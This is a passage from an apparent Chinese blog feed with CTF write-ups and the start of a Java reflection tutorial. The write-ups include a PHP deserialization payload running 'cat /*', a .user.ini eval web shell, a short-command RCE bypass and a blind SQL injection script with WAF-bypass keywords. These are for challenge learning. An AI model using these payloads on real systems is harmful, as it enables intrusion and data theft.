<p>$a=new ping();</p>
<p>$a-&gt;xiang=new cup();</p>
<p>echo serialize($a);</p>
<p>//输出：O:4:”ping”:1:{s:5:”xiang”;O:3:”cup”:1:{s:4:”data”;s:17:”system(‘cat /*’);”;}}</p>
</blockquote>
<p>得flag</p>
<p><img src="https://luokuang1.github.io/images/t2.png" width="40%" height="30%"></p>
<h2 id="龙池古庙"><a href="#龙池古庙" class="headerlink" title="龙池古庙"></a>龙池古庙</h2><p>知识点：文件上传(.user.ini文件)</p>
<p>该题目有提示信息，通过上传.user.ini文件</p>
<p>简单描述一下.user.ini文件的应用，.user.ini和.htaccess一样是目录的配置文件，.user.ini就是用户自定义的一个php.ini，我们可以利用这个文件来构造后门和隐藏后门</p>
<p>常见的用法就是通过上传一个.user.ini文件在通过一个php文件来配合使用构成一个后门</p>
<p>.user.ini文件的内容入下：</p>
<blockquote>
<p>auto_prepend_file=.user.ini</p>
<p>#&lt;?php @eval($_POST[‘a’]);?&gt;</p>
</blockquote>
<p>这个的作用相当于一个文件包含，将.user.ini的文件包含该目录下所有php文件</p>
<p>这里的题目需要前端绕过，最后的结果:</p>
<p><img src="https://luokuang1.github.io/images/t3.png" width="40%" height="30%"></p>
<p>再通过访问该目录下的index.php，通过蚁剑连接寻找flag即可</p>
<h2 id="真君擒龙"><a href="#真君擒龙" class="headerlink" title="真君擒龙"></a>真君擒龙</h2><p>知识点：rce</p>
<p>先通过查看源码，发现了一个source.php文件，访问得源码：</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">$cmd=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">if(isset($cmd)&amp;&amp;strlen($cmd)&lt;6&amp;&amp;!strpos(strtolower($cmd), &#x27;nl&#x27;))&#123;  </span><br><span class="line">   system($cmd);</span><br><span class="line">&#125;else&#123; </span><br><span class="line">   die(&quot;no!no!no!&quot;);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
</blockquote>
<p>这是一个限制长度的rce,并且将nl过滤了，但是又一个命令也是同样的简短od命令,以二进制形式读取文件，通过控制它的参数来控制返回文件是以几进制的形式，默认为八进制</p>
<p>具体为<code>od /*</code> 读取的内容为：</p>
<blockquote>
<p>0000000 066146 063541 033573 061464 033465 031142 026546 034541 0000020 032070 032055 032063 026470 061141 031143 063055 030461 0000040 061460 032145 032542 061143 076462 000012 0000053</p>
</blockquote>
<p>其中又七位或者六位的数，七位的数为偏移量，在具体解码的时候可以不用管，许多的网上的八进制解码都有问题，可以通过下面的python脚本来实现解码：</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print(b&#x27;&#x27;.join(int(ss, 8).to_bytes(2, &#x27;little&#x27;) for ss in s.split()))</span><br></pre></td></tr></table></figure>
</blockquote>
<p>s为去除偏移量的八进制数</p>
<p><img src="https://luokuang1.github.io/images/t4.png" width="40%" height="30%"></p>
<h2 id="禅蕴杨岐"><a href="#禅蕴杨岐" class="headerlink" title="禅蕴杨岐"></a>禅蕴杨岐</h2><p>知识点：sql注入，布尔盲注</p>
<p>开局只有一个输入框，进行万能密码测试没有用</p>
<blockquote>
<p> 1’or 1=1#</p>
<p> ‘^0#</p>
</blockquote>
<p>开始进行扫描，得到.index.php.swp文件，打开后的源码：</p>
<blockquote>
<p>&lt;?php<br>function contain($str, $a){<br>    $strpos_res = strpos($str, $a);<br>    if ($strpos_res){<br>        return true;<br>    }<br>    return false;<br>}</p>
<p>function lvlarrep($str, $v1){<br>    $s = str_ireplace($v1, ‘’, $str);<br>    if (contain($s, $v1)){<br>        $s = lvlarrep($s, $v1);<br>    }<br>    return $s;<br>}</p>
<p>function waf($str){<br>    $ban_str = explode(‘,’,’select,ascii,sub,con,alter table,delete ,drop ,update ,insert into,load_file,/<em>,</em>/,union,&lt;script,&lt;/script,sleep(,outfile,eval(,user(,phpinfo(),select*,union%20,sleep%20,select%20,delete%20,drop%20,and%20’);<br>    foreach($ban_str as $v1){<br>        if (contain($str, $v1)){<br>            $s = lvlarrep($str, $v1);<br>            $str = $s;<br>        }<br>    }<br>    $str = str_replace(‘\’’, ‘&#39;’, $str);    // 万恶的单引号，必须转义<br>    return $str;<br>}</p>
<p>if (isset($_POST[‘login’])){<br>    $db_host = ‘127.0.0.1’;<br>    $db_user = ‘root’;<br>    $db_pass = ‘toor’;<br>    $db_name = ‘ctf’;</p>
<p>$conn = mysqli_connect($db_host, $db_user, $db_pass, $db_name);<br>if (!$conn) {<br>    die(‘数据库连接失败！’ . mysqli_connect_error());<br>}</p>
<p>$username = waf($_POST[‘username’]);<br>$password = waf($_POST[‘password’]);<br>$sql = “SELECT * FROM user WHERE <code>username</code> = ‘$username’ AND <code>password</code> = ‘$password’;”;</p>
<p>$query_result = mysqli_query($conn, $sql);<br>if (mysqli_num_rows($query_result) &gt; 0) {<br>    die(‘登陆成功！’);<br>}else{<br>    die(‘哦欧！’);<br>}</p>
<p>}<br>?&gt;</p>
</blockquote>
<p>源码的主要信息就是通过将 ‘ 进行了过滤，以及将关键词替空，所以关键词可以通过复写的方式来绕过</p>
<p>对于单引号闭合的问题可以通过 \ 来进行转义，在与后面的 ‘ 来进行闭合</p>
<blockquote>
<p><code>username</code> =’$username’ AND <code>password</code> = ‘$password’;”;</p>
<p>上传username=1\&amp;password=or 2&gt;1#&amp;login=1  放到源码中就可以实现这样的效果</p>
<p>让$username前面的单引号和$password前面的单引号进行闭合，再注释后面的单引号来实现注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url = &quot;http://59.62.61.30:48708/&quot;</span><br><span class="line">result = &quot;&quot;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">    l = 33</span><br><span class="line">    r =130</span><br><span class="line">    mid = (l + r) &gt;&gt; 1</span><br><span class="line">    while(l&lt;r):</span><br><span class="line">       payload=&#123;</span><br><span class="line">           &quot;username&quot;:&quot;1\\&quot;,</span><br><span class="line">           #&quot;password&quot;:&#x27;or 0^((selconect asconcii(suconbstring(group_counionncat(table_name),&#123;0&#125;,1)) from information_schema.tables where table_schema=database())&gt;&#123;1&#125;)#&#x27;.format(i,mid),</span><br><span class="line">          # &quot;password&quot;: &#x27;or 0^((selconect asconcii(suconbstring(group_counionncat(column_name),&#123;0&#125;,1)) from information_schema.columns where table_name=&quot;user&quot;)&gt;&#123;1&#125;)#&#x27;.format(i, mid),</span><br><span class="line">           &quot;password&quot;: &#x27;or 0^((selconect asconcii(suconbstring(group_counionncat(password),&#123;0&#125;,1)) from user)&gt;&#123;1&#125;)#&#x27;.format(i, mid),</span><br><span class="line">           &quot;login&quot;:&quot;1&quot;</span><br><span class="line">       &#125;</span><br><span class="line">       html = requests.post(url,data=payload)</span><br><span class="line">       #print(payload)</span><br><span class="line">       if &#x27;登陆成功&#x27; in html.text:</span><br><span class="line">          l = mid+1</span><br><span class="line">       else:</span><br><span class="line">          r = mid</span><br><span class="line">       mid = (l+r)&gt;&gt;1</span><br><span class="line">    if(chr(mid)==&quot;!&quot;):</span><br><span class="line">       result = result + chr(mid)</span><br><span class="line">       break</span><br><span class="line">    result = result + chr(mid)</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>
</blockquote>
<p>最后通过二分法来获取flag</p>
]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>java反射与DNSlog链</title>
    <url>/2024/07/31/java%E5%8F%8D%E5%B0%84%E4%B8%8EDNSlog%E9%93%BE/</url>
    <content><![CDATA[<h2 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h2><p>在我看来java是反射机制，带来更广的攻击面，比如：获取属性，修改属性值，调用方法之类的，这样就使得利用空间更大了</p>
<h4 id="动态与静态语言"><a href="#动态与静态语言" class="headerlink" title="动态与静态语言"></a>动态与静态语言</h4><p><code>动态语言</code> 就是在运行时可以改变其结构的语言：例如新的函数、对象、甚至代码可以被引进，已有的函数可以被删除或是其他结构上的变化。通俗点说就是在代码运行时代码可以根据某些条件改变自身结构。</p>
<p><code>静态语言</code> 与动态语言相对应，运行时结构不可变的语言就是静态语言。</p>
<p>Java不是动态语言，但Java可以称之为”准静态语言”。即Java有一定的动态性，我们可以利用反射机制获得类似动态语言的特性。java的动态性让编程的时候更加灵活</p>
<h4 id="反射机制-Reflection"><a href="#反射机制-Reflection" class="headerlink" title="反射机制(Reflection)"></a>反射机制(Reflection)</h4><p><strong>Reflection(反射)</strong>是Java被视为动态语言的关键，反射机制允许程序在执行期借助Reflection API取得任何类的内部信息，并且直接操作任意对象的内部属性及方法、</p>
<blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span>Class.forName(<span class="string">&quot;java.a=lang.String&quot;</span>)<span class="comment">//需要抛出异常</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p><strong>流程</strong></p>
<p>加载完类以后，在堆内存的方法区中就会产生一个Class类型的对象(一个类只有一个Class对象)，这个对象就包含了一个完整的类的结构信息。我们可以通过这个对象看到类的结构。这个对象就像一面镜子，透过这个镜子看到类的结构，所以，我们现象的称之为：反射</p>
<p><img src="https://luokuang1.github.io/images/java1.png" width="60%" height="40%"></p>
<p><img src="https://luokuang1.github.io/images/java2.png" width="60%" height="40%"></p>
<blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reflection;</span><br><span class="line"></span><br><span class="line"><span class="comment">//什么叫反射</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">day1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">//通过反射获取类的Class对象</span></span><br><span class="line">        Class s1=Class.forName(<span class="string">&quot;reflection.test&quot;</span>);</span><br><span class="line">        System.out.println(s1);</span><br><span class="line">        Class s2=Class.forName(<span class="string">&quot;reflection.test&quot;</span>);</span><br><span class="line">        Class s3=Class.forName(<span class="string">&quot;reflection.test&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//一个类在内存中只有一个Class对象</span></span><br><span class="line">        <span class="comment">//一个了被加载后，类的整个结构都会被封装在Class对象中</span></span><br><span class="line">        System.out.println(s1.hashCode());<span class="comment">//1915910607</span></span><br><span class="line">        System.out.println(s2.hashCode());<span class="comment">//1915910607</span></span><br><span class="line">        System.out.println(s3.hashCode());<span class="comment">//1915910607</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//实体类：pojo entity</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;test&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&quot;, id=&quot;</span> + id +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="https://luokuang1.github.io/images/java3.png" width="60%" height="50%"></p>
<h4 id="几种常用获取Class的方法"><a href="#几种常用获取Class的方法" class="headerlink" title="几种常用获取Class的方法"></a>几种常用获取Class的方法</h4><p><strong>有三种的形式</strong></p>
<blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span>Class.forName(<span class="string">&quot;java.a=lang.String&quot;</span>)<span class="comment">//需要抛出异常 throws ClassNotFoundException</span></span><br><span class="line">Class c1=person.getClass();</span><br><span class="line">Class c2=类名.class;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">day2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        Person aa=<span class="keyword">new</span> <span class="title class_">student</span>();</span><br><span class="line">        System.out.println(<span class="string">&quot;this is &quot;</span>+aa.name);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取Class的几种方法</span></span><br><span class="line">        <span class="comment">//方法一 通过对象获得</span></span><br><span class="line">        Class c1=aa.getClass();</span><br><span class="line">        System.out.println(<span class="string">&quot;c1.hashCode()=&quot;</span>+c1.hashCode());</span><br><span class="line">        <span class="comment">//方法二 通过forname获得</span></span><br><span class="line">        Class c2=Class.forName(<span class="string">&quot;reflection.student&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;c2.hashCode()=&quot;</span>+c2.hashCode());</span><br><span class="line">        <span class="comment">//方法3 通过类名.Class获得</span></span><br><span class="line">        Class c3=student.class;</span><br><span class="line">        System.out.println(<span class="string">&quot;c3.hashCode()=&quot;</span>+c3.hashCode());</span><br><span class="line">        <span class="comment">//方法4 通过内置的 TYPE来获得 有局限</span></span><br><span class="line">        Class c4=Integer.TYPE;</span><br><span class="line">        System.out.println(c4);</span><br><span class="line">        <span class="comment">/*输出</span></span><br><span class="line"><span class="comment">        this is student</span></span><br><span class="line"><span class="comment">        c1.hashCode()=284720968</span></span><br><span class="line"><span class="comment">        c2.hashCode()=284720968</span></span><br><span class="line"><span class="comment">        c3.hashCode()=284720968</span></span><br><span class="line"><span class="comment">        int</span></span><br><span class="line"><span class="comment">        **/</span></span><br><span class="line">        <span class="comment">//获得父类类型</span></span><br><span class="line">        Class c5=c1.getSuperclass();</span><br><span class="line">        System.out.println(c5);<span class="comment">//输出  class reflection.Person</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">teacher</span> <span class="keyword">extends</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">teacher</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=<span class="string">&quot;teacher&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">student</span> <span class="keyword">extends</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">student</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=<span class="string">&quot;student&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<h4 id="java类加载内存分析"><a href="#java类加载内存分析" class="headerlink" title="java类加载内存分析"></a>java类加载内存分析</h4><p>在Java中的内存分为三个部分，<strong>栈 堆 方法区</strong></p>
<p><img src="https://luokuang1.github.io/images/java4.png" width="60%" height="50%"></p>
<h5 id="类的加载过程"><a href="#类的加载过程" class="headerlink" title="类的加载过程"></a><strong>类的加载过程</strong></h5><p>类的加载（Load） 类加载器完成将类的class文件读入内存并创建java.lang.Class对象操作。</p>
<p>类的链接（Link） 将类的二进制数据合并进JRE，在合并的过程中可以对类进行校验，检查其是否存在安全问题，是否符合JVM语法规范，接着为类变量（static）分配内存和设置默认初始值，这些内存在方法区中进行分配。最后在虚拟机中将常量名替换为引用地址。</p>
<p>类的初始化（Initialize） JVM对类进行初始化，过程中执行类构造器的方法，此方法是编译期自动收集类中的变量赋值动作和静态代码合并而成的，且虚拟机会保证类构造器的方法会在多线程中被正确的加锁和同步。且在初始化过程中，如果发现类的父类还没有被初始化，则会优先初始化其父类。</p>
<p><img src="https://luokuang1.github.io/images/java5.png" width="60%" height="50%"></p>
<blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reflection;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">day4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    A a=<span class="keyword">new</span> <span class="title class_">A</span>();</span><br><span class="line">    System.out.println(a.q);&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="type">int</span> q=<span class="number">100</span>;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;原来的q=&quot;</span>+q);</span><br><span class="line">        q=<span class="number">200</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;A类静态代码快构造成功&quot;</span>+q);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">A</span><span class="params">()</span> &#123;</span><br><span class="line">        q=<span class="number">300</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;A的无参构造成功&quot;</span>+q);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">原来的q=100</span></span><br><span class="line"><span class="comment">A类静态代码快构造成功200</span></span><br><span class="line"><span class="comment">A的无参构造成功300</span></span><br><span class="line"><span class="comment">300</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p><strong>会发生类初始化的情况</strong>：（类Class的主动引用）</p>
<p>1.虚拟机启动，首先初始化main方法所在的类</p>
<p>2.new一个类对象的时候</p>
<p>3.调用类静态成员（非final）和静态方法</p>
<p>4.使用java.lang.reflect包的方法对类进行反射调用时</p>
<p>5.初始化一个类，如果其父类没有被初始化，则优先初始化其父类</p>
<p><strong>不会发生类初始化</strong>（类的被动引用）</p>
<p>1.当访问哪一个静态域时，只有真正声明这个域的类才被初始化</p>
<p>2.通过数组定义类引用时</p>
<p>3.引用常量不会触发初始化</p>
<blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">day5</span> &#123;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;main被初始化&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">//1.主动被初始化</span></span><br><span class="line">        <span class="comment">//new一个类</span></span><br><span class="line">        <span class="comment">//s a=new s();</span></span><br><span class="line">        <span class="comment">//输出：main被初始化</span></span><br><span class="line">        <span class="comment">//     f被初始化</span></span><br><span class="line">        <span class="comment">//     s被初始化</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//反射也会产生主动初始化</span></span><br><span class="line">        <span class="comment">//Class.forName(&quot;reflection.s&quot;);</span></span><br><span class="line">        <span class="comment">//main被初始化</span></span><br><span class="line">        <span class="comment">//f被初始化</span></span><br><span class="line">        <span class="comment">//s被初始化</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//子类引用父类的static变量</span></span><br><span class="line">        <span class="comment">//System.out.println(s.q);</span></span><br><span class="line">        <span class="comment">//main被初始化</span></span><br><span class="line">        <span class="comment">//f被初始化</span></span><br><span class="line">        <span class="comment">//100</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过数组定义类引用，不会触发类的初始化</span></span><br><span class="line">        <span class="comment">//s[] w=new s[10];</span></span><br><span class="line">        <span class="comment">//main被初始化</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//引用常量不会触发此类的初始化</span></span><br><span class="line">        System.out.println(s.b);</span><br><span class="line">        <span class="comment">//main被初始化</span></span><br><span class="line">        <span class="comment">//100</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">f</span>&#123;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;f被初始化&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> <span class="type">int</span> q=<span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">s</span> <span class="keyword">extends</span> <span class="title class_">f</span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="type">int</span> a=<span class="number">100</span>;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;s被初始化&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> b=<span class="number">100</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<h5 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a><strong>类加载器</strong></h5><p>作用将class文件字节码加载到内存，并将这些静态数据转换成方法区的运行时数据结构，然后再生成一个代表这个类的java.lang.class对象，作为方法区中类数据的访问入口</p>
<p><strong>类缓存</strong>：标准的JavaSE类加载器可以按要求查找类，但是一旦某个类被加载到类加载器中，它将维持加载(缓存)一段时间，不过JVM垃圾回收机制可以回收这些class对象</p>
<p><strong>三种类型的**</strong>类加载器**</p>
<p><strong>引导类加载器</strong>：用c++编写的，是JVM自带的类加载器，负责Java平台核心库，用来装载核心类库。该类加载器无法直接获取</p>
<p><strong>扩展类加载器</strong>：负责jre/lib/ext目录下的jar包或-D java.ext.dirs 指定目录下的jar包装入工作库</p>
<p><strong>系统类加载器</strong>：负责java -classpath 或-D java.class.path所指的目录下的类与jar包装入工作，是最常用的加载器</p>
<blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">day6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//获取系统类的加载器</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">systemClassLoader</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line">        System.out.println(systemClassLoader);<span class="comment">//jdk.internal.loader.ClassLoaders$AppClassLoader@36baf30c</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取系统类加载器的父类加载--》扩展类加载器</span></span><br><span class="line">        ClassLoader parent1=systemClassLoader.getParent();</span><br><span class="line">        System.out.println(parent1);<span class="comment">//jdk.internal.loader.ClassLoaders$PlatformClassLoader@723279cf</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取扩展类加载器的父类加载器--》根加载器(C/c++)</span></span><br><span class="line">        ClassLoader parent2=parent1.getParent();</span><br><span class="line">        System.out.println(parent2);<span class="comment">//null</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//测试当前类是哪种加载器加载的</span></span><br><span class="line">        ClassLoader qwe=Class.forName(<span class="string">&quot;reflection.day6&quot;</span>).getClassLoader();</span><br><span class="line">        System.out.println(qwe);<span class="comment">//jdk.internal.loader.ClassLoaders$AppClassLoader@36baf30c</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//测试JDK内置的类是谁加载的</span></span><br><span class="line">        ClassLoader qwe1=Class.forName(<span class="string">&quot;java.lang.Object&quot;</span>).getClassLoader();</span><br><span class="line">        System.out.println(qwe1);<span class="comment">//null</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取系统类加载器可以加载的路径</span></span><br><span class="line">        System.out.println(System.getProperty(<span class="string">&quot;java.class.path&quot;</span>));</span><br><span class="line">        <span class="comment">//D:\javadm\JavaSE\javajcyf\src\out\production\javajcyf</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<h5 id="获取类的运行时结构"><a href="#获取类的运行时结构" class="headerlink" title="获取类的运行时结构"></a>获取类的运行时结构</h5><p>通过反射获取运行时类的完整结构</p>
<p>Field  Method  Constructor  Superclass  Interface  Annotation</p>
<blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reflection;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获得类的信息</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">day7</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class aa=Class.forName(<span class="string">&quot;reflection.test&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获得类的名字</span></span><br><span class="line">        System.out.println(aa.getName()); <span class="comment">//获得包名+类名</span></span><br><span class="line">        System.out.println(aa.getSimpleName()); <span class="comment">//获得类名</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//获得类的属性</span></span><br><span class="line">        Field[] fields=aa.getFields();<span class="comment">//只能获得public属性</span></span><br><span class="line">        <span class="keyword">for</span>(Field f:fields )&#123;</span><br><span class="line">            System.out.println(f);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        fields=aa.getDeclaredFields(); <span class="comment">//找到全部的属性</span></span><br><span class="line">        <span class="keyword">for</span>(Field f:fields )&#123;</span><br><span class="line">            System.out.println(f);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获得指定属性的值</span></span><br><span class="line">        Field name=aa.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        System.out.println(name);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获得类中的方法</span></span><br><span class="line">        System.out.println(<span class="string">&quot;----------------------------&quot;</span>);</span><br><span class="line">        Method[] methods=aa.getMethods();  <span class="comment">//获得本类及其父类的全部方法</span></span><br><span class="line">        <span class="keyword">for</span>(Method m:methods )&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;正常的:&quot;</span>+m);</span><br><span class="line">        &#125;</span><br><span class="line">        methods=aa.getDeclaredMethods();  <span class="comment">//获得本类的所有方法(包括私有方法)</span></span><br><span class="line">        <span class="keyword">for</span>(Method m:methods )&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;getDeclaredMethods:&quot;</span>+m);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span 